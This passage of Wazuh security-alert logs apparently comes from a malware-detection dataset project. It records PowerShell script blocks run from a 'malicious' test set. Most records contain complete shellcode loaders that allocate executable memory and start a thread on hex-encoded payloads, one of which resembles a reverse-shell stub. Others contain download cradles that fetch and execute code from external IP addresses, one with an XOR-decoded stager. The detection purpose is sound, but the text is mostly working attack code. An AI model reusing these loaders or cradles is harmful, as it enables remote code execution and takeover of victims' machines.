0xba,0x01,0xbd,0x77,0x57,0xda,0xdd,0xd9,0x74,0x24,0xf4,0x58,0x2b,0xc9,0xb1,0x47,0x31,0x50,0x13,0x03,0x50,0x13,0x83,0xe8,0xfd,0x5f,0x82,0xab,0x15,0x1d,0x6d,0x54,0xe5,0x42,0xe7,0xb1,0xd4,0x42,0x93,0xb2,0x46,0x73,0xd7,0x97,0x6a,0xf8,0xb5,0x03,0xf9,0x8c,0x11,0x23,0x4a,0x3a,0x44,0x0a,0x4b,0x17,0xb4,0x0d,0xcf,0x6a,0xe9,0xed,0xee,0xa4,0xfc,0xec,0x37,0xd8,0x0d,0xbc,0xe0,0x96,0xa0,0x51,0x85,0xe3,0x78,0xd9,0xd5,0xe2,0xf8,0x3e,0xad,0x05,0x28,0x91,0xa6,0x5f,0xea,0x13,0x6b,0xd4,0xa3,0x0b,0x68,0xd1,0x7a,0xa7,0x5a,0xad,0x7c,0x61,0x93,0x4e,0xd2,0x4c,0x1c,0xbd,0x2a,0x88,0x9a,0x5e,0x59,0xe0,0xd9,0xe3,0x5a,0x37,0xa0,0x3f,0xee,0xac,0x02,0xcb,0x48,0x09,0xb3,0x18,0x0e,0xda,0xbf,0xd5,0x44,0x84,0xa3,0xe8,0x89,0xbe,0xdf,0x61,0x2c,0x11,0x56,0x31,0x0b,0xb5,0x33,0xe1,0x32,0xec,0x99,0x44,0x4a,0xee,0x42,0x38,0xee,0x64,0x6e,0x2d,0x83,0x26,0xe6,0x82,0xae,0xd8,0xf6,0x8c,0xb9,0xab,0xc4,0x13,0x12,0x24,0x64,0xdb,0xbc,0xb3,0x8b,0xf6,0x79,0x2b,0x72,0xf9,0x79,0x65,0xb0,0xad,0x29,0x1d,0x11,0xce,0xa1,0xdd,0x9e,0x1b,0x5f,0xdb,0x08,0x08,0xb0,0xd1,0x44,0x38,0xb3,0x15,0x70,0x08,0x3a,0xf3,0x28,0x3a,0x6d,0xac,0x88,0xea,0xcd,0x1c,0x60,0xe1,0xc1,0x43,0x90,0x0a,0x08,0xec,0x3a,0xe5,0xe5,0x44,0xd2,0x9c,0xaf,0x1f,0x43,0x60,0x7a,0x5a,0x43,0xea,0x89,0x9a,0x0d,0x1b,0xe7,0x88,0xf9,0xeb,0xb2,0xf3,0xaf,0xf4,0x68,0x99,0x4f,0x61,0x97,0x08,0x18,0x1d,0x95,0x6d,0x6e,0x82,0x66,0x58,0xe5,0x0b,0xf3,0x23,0x91,0x73,0x13,0xa4,0x61,0x22,0x79,0xa4,0x09,0x92,0xd9,0xf7,0x2c,0xdd,0xf7,0x6b,0xfd,0x48,0xf8,0xdd,0x52,0xda,0x90,0xe3,0x8d,0x2c,0x3f,0x1b,0xf8,0xac,0x03,0xca,0xc4,0xda,0x6d,0xce;$g = 0x1000;if ($z.Length -gt 0x1000){$g = $z.Length};$x=$w::VirtualAlloc(0,0x1000,$g,0x40);for ($i=0;$i -le ($z.Length-1);$i++) {$w::memset([IntPtr]($x.ToInt32()+$i), $z[$i], 1)};$w::CreateThread(0,0,$x,0,0,0);for (;;){Start-sleep 60};","scriptBlockId":"a25ab84e-2ac1-4a6b-9806-e40789a6e80a","path":"C:\\\\TA\\\\project-ta\\\\data_spliting\\\\test_set\\\\malicious\\\\334.ps1"}}},"location":"EventChannel"}
{"timestamp":"2026-07-06T02:21:10.680+0000","rule":{"level":10,"description":"Powershell script may be executing suspicious code with CreateThread API","id":"91810","mitre":{"id":["T1106"],"tactic":["Execution"],"technique":["Native API"]},"firedtimes":172,"mail":false,"groups":["windows"," powershell"]},"agent":{"id":"002","name":"DESKTOP-BAC9DBQ","ip":"192.168.1.12"},"manager":{"name":"wazuh-server"},"id":"1783304470.3725765","decoder":{"name":"windows_eventchannel"},"data":{"win":{"system":{"providerName":"Microsoft-Windows-PowerShell","providerGuid":"{a0c1853b-5c40-4b15-8766-3cf1c58f985a}","eventID":"4104","version":"1","level":"3","task":"2","opcode":"15","keywords":"0x0","systemTime":"2026-07-06T02:21:31.0972628Z","eventRecordID":"145621","processID":"2304","threadID":"2172","channel":"Microsoft-Windows-PowerShell/Operational","computer":"DESKTOP-BAC9DBQ","severityValue":"WARNING","message":"\"Creating Scriptblock text (1 of 1):\r\n$5xO = '[DllImport(\"kernel32.dll\")]public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);[DllImport(\"kernel32.dll\")]public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);[DllImport(\"msvcrt.dll\")]public static extern IntPtr memset(IntPtr dest, uint src, uint count);';$w = Add-Type -memberDefinition $5xO -Name \"Win32\" -namespace Win32Functions -passthru;[Byte[]];[Byte[]]$z = 0xda,0xd0,0xd9,0x74,0x24,0xf4,0xb8,0x63,0x2d,0x9b,0xb6,0x5b,0x33,0xc9,0xb1,0x47,0x83,0xeb,0xfc,0x31,0x43,0x14,0x03,0x43,0x77,0xcf,0x6e,0x4a,0x9f,0x8d,0x91,0xb3,0x5f,0xf2,0x18,0x56,0x6e,0x32,0x7e,0x12,0xc0,0x82,0xf4,0x76,0xec,0x69,0x58,0x63,0x67,0x1f,0x75,0x84,0xc0,0xaa,0xa3,0xab,0xd1,0x87,0x90,0xaa,0x51,0xda,0xc4,0x0c,0x68,0x15,0x19,0x4c,0xad,0x48,0xd0,0x1c,0x66,0x06,0x47,0xb1,0x03,0x52,0x54,0x3a,0x5f,0x72,0xdc,0xdf,0x17,0x75,0xcd,0x71,0x2c,0x2c,0xcd,0x70,0xe1,0x44,0x44,0x6b,0xe6,0x61,0x1e,0x00,0xdc,0x1e,0xa1,0xc0,0x2d,0xde,0x0e,0x2d,0x82,0x2d,0x4e,0x69,0x24,0xce,0x25,0x83,0x57,0x73,0x3e,0x50,0x2a,0xaf,0xcb,0x43,0x8c,0x24,0x6b,0xa8,0x2d,0xe8,0xea,0x3b,0x21,0x45,0x78,0x63,0x25,0x58,0xad,0x1f,0x51,0xd1,0x50,0xf0,0xd0,0xa1,0x76,0xd4,0xb9,0x72,0x16,0x4d,0x67,0xd4,0x27,0x8d,0xc8,0x89,0x8d,0xc5,0xe4,0xde,0xbf,0x87,0x60,0x12,0xf2,0x37,0x70,0x3c,0x85,0x44,0x42,0xe3,0x3d,0xc3,0xee,0x6c,0x98,0x14,0x11,0x47,0x5c,0x8a,0xec,0x68,0x9d,0x82,0x2a,0x3c,0xcd,0xbc,0x9b,0x3d,0x86,0x3c,0x24,0xe8,0x33,0x38,0xb2,0xd3,0x6c,0x43,0x6a,0xbc,0x6e,0x44,0x6e,0x80,0xe6,0xa2,0x3e,0xa8,0xa8,0x7a,0xfe,0x18,0x09,0x2b,0x96,0x72,0x86,0x14,0x86,0x7c,0x4c,0x3d,0x2c,0x93,0x39,0x15,0xd8,0x0a,0x60,0xed,0x79,0xd2,0xbe,0x8b,0xb9,0x58,0x4d,0x6b,0x77,0xa9,0x38,0x7f,0xef,0x59,0x77,0xdd,0xb9,0x66,0xad,0x48,0x45,0xf3,0x4a,0xdb,0x12,0x6b,0x51,0x3a,0x54,0x34,0xaa,0x69,0xef,0xfd,0x3e,0xd2,0x87,0x01,0xaf,0xd2,0x57,0x54,0xa5,0xd2,0x3f,0x00,0x9d,0x80,0x5a,0x4f,0x08,0xb5,0xf7,0xda,0xb3,0xec,0xa4,0x4d,0xdc,0x12,0x93,0xba,0x43,0xec,0xf6,0x3a,0xbf,0x3b,0x3e,0x49,0xd1,0xff;$g = 0x1000;if ($z.Length -gt 0x1000){$g = $z.Length};$BLp=$w::VirtualAlloc(0,0x1000,$g,0x40);for ($i=0;$i -le ($z.Length-1);$i++) {$w::memset([IntPtr]($BLp.ToInt32()+$i), $z[$i], 1)};$w::CreateThread(0,0,$BLp,0,0,0);for (;;){Start-sleep 60};\r\n\r\nScriptBlock ID: 70cbc53e-7656-495b-87d7-0e6412ceff51\r\nPath: C:\\TA\\project-ta\\data_spliting\\test_set\\malicious\\3359.ps1\""},"eventdata":{"messageNumber":"1","messageTotal":"1","scriptBlockText":"$5xO = '[DllImport(\\\"kernel32.dll\\\")]public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);[DllImport(\\\"kernel32.dll\\\")]public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);[DllImport(\\\"msvcrt.dll\\\")]public static extern IntPtr memset(IntPtr dest, uint src, uint count);';$w = Add-Type -memberDefinition $5xO -Name \\\"Win32\\\" -namespace Win32Functions -passthru;[Byte[]];[Byte[]]$z = 0xda,0xd0,0xd9,0x74,0x24,0xf4,0xb8,0x63,0x2d,0x9b,0xb6,0x5b,0x33,0xc9,0xb1,0x47,0x83,0xeb,0xfc,0x31,0x43,0x14,0x03,0x43,0x77,0xcf,0x6e,0x4a,0x9f,0x8d,0x91,0xb3,0x5f,0xf2,0x18,0x56,0x6e,0x32,0x7e,0x12,0xc0,0x82,0xf4,0x76,0xec,0x69,0x58,0x63,0x67,0x1f,0x75,0x84,0xc0,0xaa,0xa3,0xab,0xd1,0x87,0x90,0xaa,0x51,0xda,0xc4,0x0c,0x68,0x15,0x19,0x4c,0xad,0x48,0xd0,0x1c,0x66,0x06,0x47,0xb1,0x03,0x52,0x54,0x3a,0x5f,0x72,0xdc,0xdf,0x17,0x75,0xcd,0x71,0x2c,0x2c,0xcd,0x70,0xe1,0x44,0x44,0x6b,0xe6,0x61,0x1e,0x00,0xdc,0x1e,0xa1,0xc0,0x2d,0xde,0x0e,0x2d,0x82,0x2d,0x4e,0x69,0x24,0xce,0x25,0x83,0x57,0x73,0x3e,0x50,0x2a,0xaf,0xcb,0x43,0x8c,0x24,0x6b,0xa8,0x2d,0xe8,0xea,0x3b,0x21,0x45,0x78,0x63,0x25,0x58,0xad,0x1f,0x51,0xd1,0x50,0xf0,0xd0,0xa1,0x76,0xd4,0xb9,0x72,0x16,0x4d,0x67,0xd4,0x27,0x8d,0xc8,0x89,0x8d,0xc5,0xe4,0xde,0xbf,0x87,0x60,0x12,0xf2,0x37,0x70,0x3c,0x85,0x44,0x42,0xe3,0x3d,0xc3,0xee,0x6c,0x98,0x14,0x11,0x47,0x5c,0x8a,0xec,0x68,0x9d,0x82,0x2a,0x3c,0xcd,0xbc,0x9b,0x3d,0x86,0x3c,0x24,0xe8,0x33,0x38,0xb2,0xd3,0x6c,0x43,0x6a,0xbc,0x6e,0x44,0x6e,0x80,0xe6,0xa2,0x3e,0xa8,0xa8,0x7a,0xfe,0x18,0x09,0x2b,0x96,0x72,0x86,0x14,0x86,0x7c,0x4c,0x3d,0x2c,0x93,0x39,0x15,0xd8,0x0a,0x60,0xed,0x79,0xd2,0xbe,0x8b,0xb9,0x58,0x4d,0x6b,0x77,0xa9,0x38,0x7f,0xef,0x59,0x77,0xdd,0xb9,0x66,0xad,0x48,0x45,0xf3,0x4a,0xdb,0x12,0x6b,0x51,0x3a,0x54,0x34,0xaa,0x69,0xef,0xfd,0x3e,0xd2,0x87,0x01,0xaf,0xd2,0x57,0x54,0xa5,0xd2,0x3f,0x00,0x9d,0x80,0x5a,0x4f,0x08,0xb5,0xf7,0xda,0xb3,0xec,0xa4,0x4d,0xdc,0x12,0x93,0xba,0x43,0xec,0xf6,0x3a,0xbf,0x3b,0x3e,0x49,0xd1,0xff;$g = 0x1000;if ($z.Length -gt 0x1000){$g = $z.Length};$BLp=$w::VirtualAlloc(0,0x1000,$g,0x40);for ($i=0;$i -le ($z.Length-1);$i++) {$w::memset([IntPtr]($BLp.ToInt32()+$i), $z[$i], 1)};$w::CreateThread(0,0,$BLp,0,0,0);for (;;){Start-sleep 60};","scriptBlockId":"70cbc53e-7656-495b-87d7-0e6412ceff51","path":"C:\\\\TA\\\\project-ta\\\\data_spliting\\\\test_set\\\\malicious\\\\3359.ps1"}}},"location":"EventChannel"}
{"timestamp":"2026-07-06T02:21:12.017+0000","rule":{"level":4,"description":"Powershell executed \"Get-Content -Stream or Invoke-Expresion\". Possible string execution as code","id":"91837","mitre":{"id":["T1059.001"],"tactic":["Execution"],"technique":["PowerShell"]},"firedtimes":12,"mail":false,"groups":["windows"," powershell"]},"agent":{"id":"002","name":"DESKTOP-BAC9DBQ","ip":"192.168.1.12"},"manager":{"name":"wazuh-server"},"id":"1783304472.3737114","decoder":{"name":"windows_eventchannel"},"data":{"win":{"system":{"providerName":"Microsoft-Windows-PowerShell","providerGuid":"{a0c1853b-5c40-4b15-8766-3cf1c58f985a}","eventID":"4104","version":"1","level":"5","task":"2","opcode":"15","keywords":"0x0","systemTime":"2026-07-06T02:21:31.9089762Z","eventRecordID":"145625","processID":"5124","threadID":"8916","channel":"Microsoft-Windows-PowerShell/Operational","computer":"DESKTOP-BAC9DBQ","severityValue":"VERBOSE","message":"\"Creating Scriptblock text (1 of 1):\r\n$wc=NEW-ObJECT SySTEM.NET.WebClIeNt;$u='Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko';[System.Net.ServicePointManager]::ServerCertificateValidationCallback = {$true};$Wc.HeaDErS.ADD('User-Agent',$u);$wc.PROXY = [SysTEM.NeT.WebREQuesT]::DeFAulTWEBPrOxy;$wc.PROXY.CReDEntiAlS = [SYSTem.NeT.CRedEnTiAlCachE]::DEfAuLTNeTwOrkCredenTIALS;$K='879526880aa49cbc97d52c1088645422';$R=5;DO{TRy{$I=0;[cHAR[]]$B=([cHAR[]]($WC.DOWNLOADSTRiNg(\"https://52.39.227.108:443/index.asp\")))|%{$_-bXOr$K[$I++%$K.LENGth]};IEX ($B-JoIN''); $R=0;}caTCH{SleEp 5;$R--}} WHile ($R -GT 0)\r\n\r\nScriptBlock ID: 0b0eecd1-b5da-4f98-9c0b-70b8d31d43af\r\nPath: C:\\TA\\project-ta\\data_spliting\\test_set\\malicious\\3361.ps1\""},"eventdata":{"messageNumber":"1","messageTotal":"1","scriptBlockText":"$wc=NEW-ObJECT SySTEM.NET.WebClIeNt;$u='Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko';[System.Net.ServicePointManager]::ServerCertificateValidationCallback = {$true};$Wc.HeaDErS.ADD('User-Agent',$u);$wc.PROXY = [SysTEM.NeT.WebREQuesT]::DeFAulTWEBPrOxy;$wc.PROXY.CReDEntiAlS = [SYSTem.NeT.CRedEnTiAlCachE]::DEfAuLTNeTwOrkCredenTIALS;$K='879526880aa49cbc97d52c1088645422';$R=5;DO{TRy{$I=0;[cHAR[]]$B=([cHAR[]]($WC.DOWNLOADSTRiNg(\\\"https://52.39.227.108:443/index.asp\\\")))|%{$_-bXOr$K[$I++%$K.LENGth]};IEX ($B-JoIN''); $R=0;}caTCH{SleEp 5;$R--}} WHile ($R -GT 0)","scriptBlockId":"0b0eecd1-b5da-4f98-9c0b-70b8d31d43af","path":"C:\\\\TA\\\\project-ta\\\\data_spliting\\\\test_set\\\\malicious\\\\3361.ps1"}}},"location":"EventChannel"}
{"timestamp":"2026-07-06T02:21:12.129+0000","rule":{"level":4,"description":"Powershell executed \"Get-Content -Stream or Invoke-Expresion\". Possible string execution as code","id":"91837","mitre":{"id":["T1059.001"],"tactic":["Execution"],"technique":["PowerShell"]},"firedtimes":13,"mail":false,"groups":["windows"," powershell"]},"agent":{"id":"002","name":"DESKTOP-BAC9DBQ","ip":"192.168.1.12"},"manager":{"name":"wazuh-server"},"id":"1783304472.3741456","decoder":{"name":"windows_eventchannel"},"data":{"win":{"system":{"providerName":"Microsoft-Windows-PowerShell","providerGuid":"{a0c1853b-5c40-4b15-8766-3cf1c58f985a}","eventID":"4104","version":"1","level":"5","task":"2","opcode":"15","keywords":"0x0","systemTime":"2026-07-06T02:21:32.6154125Z","eventRecordID":"145629","processID":"2360","threadID":"7056","channel":"Microsoft-Windows-PowerShell/Operational","computer":"DESKTOP-BAC9DBQ","severityValue":"VERBOSE","message":"\"Creating Scriptblock text (1 of 1):\r\nIEX (New-Object Net.WebClient).DownloadString('http://91.120.23.152/wizz.txt')\r\n\r\nScriptBlock ID: b71e0dda-b3fe-4f0b-8f1f-5a3cdf476590\r\nPath: C:\\TA\\project-ta\\data_spliting\\test_set\\malicious\\338.ps1\""},"eventdata":{"messageNumber":"1","messageTotal":"1","scriptBlockText":"IEX (New-Object Net.WebClient).DownloadString('http://91.120.23.152/wizz.txt')","scriptBlockId":"b71e0dda-b3fe-4f0b-8f1f-5a3cdf476590","path":"C:\\\\TA\\\\project-ta\\\\data_spliting\\\\test_set\\\\malicious\\\\338.ps1"}}},"location":"EventChannel"}
{"timestamp":"2026-07-06T02:21:13.588+0000","rule":{"level":10,"description":"Powershell script may be executing suspicious code with CreateThread API","id":"91810","mitre":{"id":["T1106"],"tactic":["Execution"],"technique":["Native API"]},"firedtimes":173,"mail":false,"groups":["windows"," powershell"]},"agent":{"id":"002","name":"DESKTOP-BAC9DBQ","ip":"192.168.1.12"},"manager":{"name":"wazuh-server"},"id":"1783304473.3743772","decoder":{"name":"windows_eventchannel"},"data":{"win":{"system":{"providerName":"Microsoft-Windows-PowerShell","providerGuid":"{a0c1853b-5c40-4b15-8766-3cf1c58f985a}","eventID":"4104","version":"1","level":"3","task":"2","opcode":"15","keywords":"0x0","systemTime":"2026-07-06T02:21:33.4565496Z","eventRecordID":"145633","processID":"3324","threadID":"8272","channel":"Microsoft-Windows-PowerShell/Operational","computer":"DESKTOP-BAC9DBQ","severityValue":"WARNING","message":"\"Creating Scriptblock text (1 of 1):\r\n$j3wg = '[DllImport(\"kernel32.dll\")]public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);[DllImport(\"kernel32.dll\")]public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);[DllImport(\"msvcrt.dll\")]public static extern IntPtr memset(IntPtr dest, uint src, uint count);';$w = Add-Type -memberDefinition $j3wg -Name \"Win32\" -namespace Win32Functions -passthru;[Byte[]];[Byte[]]$z = 0xda,0xda,0xbb,0x3f,0x54,0x9b,0xaa,0xd9,0x74,0x24,0xf4,0x5a,0x2b,0xc9,0xb1,0x57,0x83,0xc2,0x04,0x31,0x5a,0x16,0x03,0x5a,0x16,0xe2,0xca,0xa8,0x73,0x28,0x34,0x51,0x84,0x4d,0xbd,0xb4,0xb5,0x4d,0xd9,0xbd,0xe6,0x7d,0xaa,0x90,0x0a,0xf5,0xfe,0x00,0x98,0x7b,0xd6,0x27,0x29,0x31,0x00,0x09,0xaa,0x6a,0x70,0x08,0x28,0x71,0xa4,0xea,0x11,0xba,0xb9,0xeb,0x56,0xa7,0x33,0xb9,0x0f,0xa3,0xe1,0x2e,0x3b,0xf9,0x39,0xc4,0x77,0xef,0x39,0x39,0xcf,0x0e,0x68,0xec,0x5b,0x49,0xaa,0x0e,0x8f,0xe1,0xe3,0x08,0xcc,0xcc,0xba,0xa3,0x26,0xba,0x3d,0x62,0x77,0x43,0x91,0x4b,0xb7,0xb6,0xe8,0x8c,0x70,0x29,0x9f,0xe4,0x82,0xd4,0xa7,0x32,0xf8,0x02,0x22,0xa1,0x5a,0xc0,0x94,0x0d,0x5a,0x05,0x42,0xc5,0x50,0xe2,0x01,0x81,0x74,0xf5,0xc6,0xb9,0x81,0x7e,0xe9,0x6d,0x00,0xc4,0xcd,0xa9,0x48,0x9e,0x6c,0xeb,0x34,0x71,0x91,0xeb,0x96,0x2e,0x37,0x67,0x3a,0x3a,0x4a,0x2a,0x53,0xd2,0x31,0xa1,0xa3,0x42,0xce,0x20,0xca,0xfb,0x64,0xdb,0x5e,0x8b,0xa2,0x1c,0xa0,0xa6,0x9b,0xf9,0x0d,0x1a,0x88,0xae,0xe2,0xf4,0x14,0x07,0x7c,0xa2,0x97,0x72,0x2d,0xff,0x0d,0x7e,0x81,0xac,0xb9,0x3b,0x24,0x53,0x39,0xd4,0xab,0x53,0x39,0x24,0x9b,0x60,0x6d,0x77,0xd7,0xc8,0x8d,0x27,0x7f,0x82,0x04,0x58,0xb9,0xd3,0xc3,0xee,0x80,0x7f,0x83,0xf0,0x3e,0x60,0xd7,0xa2,0x6d,0x33,0x80,0x17,0xc4,0xdb,0xc5,0xcd,0xc6,0x20,0xe6,0x3b,0x80,0x3d,0x12,0x9b,0xc5,0x41,0x11,0x23,0x16,0xcb,0xb5,0x49,0x12,0x9b,0x5f,0x91,0x4c,0x73,0xea,0xeb,0xee,0x05,0xeb,0x21,0x5d,0x59,0x40,0x99,0x34,0x35,0x4b,0x1b,0xa1,0xbe,0x6c,0xf6,0x54,0x80,0xe7,0xf3,0x19,0x74,0xde,0x6c,0x56,0xc3,0x42,0x3a,0x69,0xf9,0xe8,0x83,0xfd,0x02,0xfc,0x03,0xfe,0x6a,0xfc,0x03,0xbe,0x6a,0xaf,0x6b,0x66,0xcf,0x1c,0x89,0x69,0xda,0x31,0x02,0xc5,0x6c,0xd2,0xf2,0x81,0x6e,0x3c,0xfd,0x51,0x3c,0x6a,0x95,0x43,0x54,0x1b,0x87,0x9b,0x8d,0x9e,0x88,0x10,0xe3,0x2b,0x0f,0xd8,0x38,0xae,0xd0,0xaf,0x5b,0xe8,0x13,0x10,0x4c,0x7d,0x6b,0x50,0x73,0x4c,0xab,0x9b,0xa2,0x9f,0xfc,0xd2,0x94,0xed,0x37,0x24,0xc7,0x20,0x0e,0x75,0x17;$g = 0x1000;if ($z.Length -gt 0x1000){$g = $z.Length};$V4R=$w::VirtualAlloc(0,0x1000,$g,0x40);for ($i=0;$i -le ($z.Length-1);$i++) {$w::memset([IntPtr]($V4R.ToInt32()+$i), $z[$i], 1)};$w::CreateThread(0,0,$V4R,0,0,0);for (;;){Start-sleep 60};\r\n\r\nScriptBlock ID: 1bdb8338-5571-4278-af01-2451dc8155d9\r\nPath: C:\\TA\\project-ta\\data_spliting\\test_set\\malicious\\3385.ps1\""},"eventdata":{"messageNumber":"1","messageTotal":"1","scriptBlockText":"$j3wg = '[DllImport(\\\"kernel32.dll\\\")]public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);[DllImport(\\\"kernel32.dll\\\")]public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);[DllImport(\\\"msvcrt.dll\\\")]public static extern IntPtr memset(IntPtr dest, uint src, uint count);';$w = Add-Type -memberDefinition $j3wg -Name \\\"Win32\\\" -namespace Win32Functions -passthru;[Byte[]];[Byte[]]$z = 0xda,0xda,0xbb,0x3f,0x54,0x9b,0xaa,0xd9,0x74,0x24,0xf4,0x5a,0x2b,0xc9,0xb1,0x57,0x83,0xc2,0x04,0x31,0x5a,0x16,0x03,0x5a,0x16,0xe2,0xca,0xa8,0x73,0x28,0x34,0x51,0x84,0x4d,0xbd,0xb4,0xb5,0x4d,0xd9,0xbd,0xe6,0x7d,0xaa,0x90,0x0a,0xf5,0xfe,0x00,0x98,0x7b,0xd6,0x27,0x29,0x31,0x00,0x09,0xaa,0x6a,0x70,0x08,0x28,0x71,0xa4,0xea,0x11,0xba,0xb9,0xeb,0x56,0xa7,0x33,0xb9,0x0f,0xa3,0xe1,0x2e,0x3b,0xf9,0x39,0xc4,0x77,0xef,0x39,0x39,0xcf,0x0e,0x68,0xec,0x5b,0x49,0xaa,0x0e,0x8f,0xe1,0xe3,0x08,0xcc,0xcc,0xba,0xa3,0x26,0xba,0x3d,0x62,0x77,0x43,0x91,0x4b,0xb7,0xb6,0xe8,0x8c,0x70,0x29,0x9f,0xe4,0x82,0xd4,0xa7,0x32,0xf8,0x02,0x22,0xa1,0x5a,0xc0,0x94,0x0d,0x5a,0x05,0x42,0xc5,0x50,0xe2,0x01,0x81,0x74,0xf5,0xc6,0xb9,0x81,0x7e,0xe9,0x6d,0x00,0xc4,0xcd,0xa9,0x48,0x9e,0x6c,0xeb,0x34,0x71,0x91,0xeb,0x96,0x2e,0x37,0x67,0x3a,0x3a,0x4a,0x2a,0x53,0xd2,0x31,0xa1,0xa3,0x42,0xce,0x20,0xca,0xfb,0x64,0xdb,0x5e,0x8b,0xa2,0x1c,0xa0,0xa6,0x9b,0xf9,0x0d,0x1a,0x88,0xae,0xe2,0xf4,0x14,0x07,0x7c,0xa2,0x97,0x72,0x2d,0xff,0x0d,0x7e,0x81,0xac,0xb9,0x3b,0x24,0x53,0x39,0xd4,0xab,0x53,0x39,0x24,0x9b,0x60,0x6d,0x77,0xd7,0xc8,0x8d,0x27,0x7f,0x82,0x04,0x58,0xb9,0xd3,0xc3,0xee,0x80,0x7f,0x83,0xf0,0x3e,0x60,0xd7,0xa2,0x6d,0x33,0x80,0x17,0xc4,0xdb,0xc5,0xcd,0xc6,0x20,0xe6,0x3b,0x80,0x3d,0x12,0x9b,0xc5,0x41,0x11,0x23,0x16,0xcb,0xb5,0x49,0x12,0x9b,0x5f,0x91,0x4c,0x73,0xea,0xeb,0xee,0x05,0xeb,0x21,0x5d,0x59,0x40,0x99,0x34,0x35,0x4b,0x1b,0xa1,0xbe,0x6c,0xf6,0x54,0x80,0xe7,0xf3,0x19,0x74,0xde,0x6c,0x56,0xc3,0x42,0x3a,0x69,0xf9,0xe8,0x83,0xfd,0x02,0xfc,0x03,0xfe,0x6a,0xfc,0x03,0xbe,0x6a,0xaf,0x6b,0x66,0xcf,0x1c,0x89,0x69,0xda,0x31,0x02,0xc5,0x6c,0xd2,0xf2,0x81,0x6e,0x3c,0xfd,0x51,0x3c,0x6a,0x95,0x43,0x54,0x1b,0x87,0x9b,0x8d,0x9e,0x88,0x10,0xe3,0x2b,0x0f,0xd8,0x38,0xae,0xd0,0xaf,0x5b,0xe8,0x13,0x10,0x4c,0x7d,0x6b,0x50,0x73,0x4c,0xab,0x9b,0xa2,0x9f,0xfc,0xd2,0x94,0xed,0x37,0x24,0xc7,0x20,0x0e,0x75,0x17;$g = 0x1000;if ($z.Length -gt 0x1000){$g = $z.Length};$V4R=$w::VirtualAlloc(0,0x1000,$g,0x40);for ($i=0;$i -le ($z.Length-1);$i++) {$w::memset([IntPtr]($V4R.ToInt32()+$i), $z[$i], 1)};$w::CreateThread(0,0,$V4R,0,0,0);for (;;){Start-sleep 60};","scriptBlockId":"1bdb8338-5571-4278-af01-2451dc8155d9","path":"C:\\\\TA\\\\project-ta\\\\data_spliting\\\\test_set\\\\malicious\\\\3385.ps1"}}},"location":"EventChannel"}
{"timestamp":"2026-07-06T02:21:13.683+0000","rule":{"level":10,"description":"Powershell script may be executing suspicious code with CreateThread API","id":"91810","mitre":{"id":["T1106"],"tactic":["Execution"],"technique":["Native API"]},"firedtimes":174,"mail":false,"groups":["windows"," powershell"]},"agent":{"id":"002","name":"DESKTOP-BAC9DBQ","ip":"192.168.1.12"},"manager":{"name":"wazuh-server"},"id":"1783304473.3756449","decoder":{"name":"windows_eventchannel"},"data":{"win":{"system":{"providerName":"Microsoft-Windows-PowerShell","providerGuid":"{a0c1853b-5c40-4b15-8766-3cf1c58f985a}","eventID":"4104","version":"1","level":"3","task":"2","opcode":"15","keywords":"0x0","systemTime":"2026-07-06T02:21:34.1988320Z","eventRecordID":"145637","processID":"6616","threadID":"6496","channel":"Microsoft-Windows-PowerShell/Operational","computer":"DESKTOP-BAC9DBQ","severityValue":"WARNING","message":"\"Creating Scriptblock text (1 of 1):\r\n$ox6F = '[DllImport(\"kernel32.dll\")]public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);[DllImport(\"kernel32.dll\")]public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);[DllImport(\"msvcrt.dll\")]public static extern IntPtr memset(IntPtr dest, uint src, uint count);';$w = Add-Type -memberDefinition $ox6F -Name \"Win32\" -namespace Win32Functions -passthru;[Byte[]];[Byte[]]$z = 0xfc,0xe8,0x89,0x00,0x00,0x00,0x60,0x89,0xe5,0x31,0xd2,0x64,0x8b,0x52,0x30,0x8b,0x52,0x0c,0x8b,0x52,0x14,0x8b,0x72,0x28,0x0f,0xb7,0x4a,0x26,0x31,0xff,0x31,0xc0,0xac,0x3c,0x61,0x7c,0x02,0x2c,0x20,0xc1,0xcf,0x0d,0x01,0xc7,0xe2,0xf0,0x52,0x57,0x8b,0x52,0x10,0x8b,0x42,0x3c,0x01,0xd0,0x8b,0x40,0x78,0x85,0xc0,0x74,0x4a,0x01,0xd0,0x50,0x8b,0x48,0x18,0x8b,0x58,0x20,0x01,0xd3,0xe3,0x3c,0x49,0x8b,0x34,0x8b,0x01,0xd6,0x31,0xff,0x31,0xc0,0xac,0xc1,0xcf,0x0d,0x01,0xc7,0x38,0xe0,0x75,0xf4,0x03,0x7d,0xf8,0x3b,0x7d,0x24,0x75,0xe2,0x58,0x8b,0x58,0x24,0x01,0xd3,0x66,0x8b,0x0c,0x4b,0x8b,0x58,0x1c,0x01,0xd3,0x8b,0x04,0x8b,0x01,0xd0,0x89,0x44,0x24,0x24,0x5b,0x5b,0x61,0x59,0x5a,0x51,0xff,0xe0,0x58,0x5f,0x5a,0x8b,0x12,0xeb,0x86,0x5d,0x68,0x33,0x32,0x00,0x00,0x68,0x77,0x73,0x32,0x5f,0x54,0x68,0x4c,0x77,0x26,0x07,0xff,0xd5,0xb8,0x90,0x01,0x00,0x00,0x29,0xc4,0x54,0x50,0x68,0x29,0x80,0x6b,0x00,0